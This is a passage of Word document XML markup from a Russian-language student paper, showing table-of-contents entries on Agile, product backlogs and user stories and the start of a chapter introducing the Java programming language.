        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Бэклог</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> продукта</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>………………………………………………….</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F33D0A" w:rsidRPr="00F33D0A" w:rsidRDefault="00F33D0A" w:rsidP="001826E6">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F33D0A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Основополагающие принципы </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F33D0A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Agile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F33D0A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-манифеста</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……………...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F33D0A" w:rsidRDefault="00F33D0A" w:rsidP="001826E6">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Задание…………………………………………………………...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F33D0A" w:rsidRPr="00872F21" w:rsidRDefault="00F33D0A" w:rsidP="001826E6">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Работа с пользовательскими историями</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……………………….</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00872F21" w:rsidRPr="006D07EF" w:rsidRDefault="00872F21" w:rsidP="00872F21">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="006D07EF" w:rsidRDefault="005E2C4B" w:rsidP="005E2C4B">
      <w:pPr>
        <w:keepNext/>
        <w:pageBreakBefore/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ГЛАВА 1 ОСНОВНЫЕ О ЯЗЫКЕ JAVA. ОСОБЕННОСТИ, ПЛЮСЫ И МИНУСЫ</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00DD2596" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Осн</w:t>
      </w:r>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ов</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>н</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>аспекти</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00DD2596" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> — сильно типизированный </w:t>
      </w:r>
      <w:hyperlink r:id="rId5" w:tooltip="Объектно-ориентированный язык программирования" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>объектно-ориентированный язык программирования</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, разработанный компанией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/Sun_Microsystems" \o "Sun Microsystems" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Sun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Microsystems</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> (в последующем приобретённой компанией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/Oracle" \o "Oracle" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">). Приложения </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> обычно </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:tooltip="Транслятор" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>транслируются</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> в специальный </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:tooltip="Байт-код" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>байт-код</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, поэтому они могут работать на любой компьютерной архитектуре с помощью </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:tooltip="Java Virtual Machine" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t xml:space="preserve">виртуальной </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>Java</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>-машины</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">. Дата официального выпуска — 23 мая 1995 года. На 2018 год </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> — один из самых популярных языков программирования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00DD2596" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>История создания</w:t>
      </w:r>
      <w:r w:rsidR="00DD2596" w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DD2596" w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>особенности</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
